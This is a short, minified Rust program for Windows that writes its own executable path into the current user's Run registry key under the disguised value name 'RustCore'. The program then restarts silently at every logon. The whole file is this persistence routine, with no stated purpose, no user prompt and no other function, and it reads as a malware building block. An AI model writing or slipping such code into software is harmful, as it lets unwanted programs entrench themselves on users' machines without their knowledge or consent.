extern crate winapi;use winapi::um::winreg::*;use std::ptr;fn main(){unsafe{let mut k=ptr::null_mut();RegCreateKeyExA(HKEY_CURRENT_USER,b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".as_ptr()as _,0,ptr::null_mut(),0,0x20006,ptr::null_mut(),&mut k,ptr::null_mut());let e=std::env::current_exe().unwrap().to_str().unwrap().to_string();RegSetValueExA(k,b"RustCore\0".as_ptr()as _,0,1,e.as_ptr(),e.len()as _);RegCloseKey(k);}}
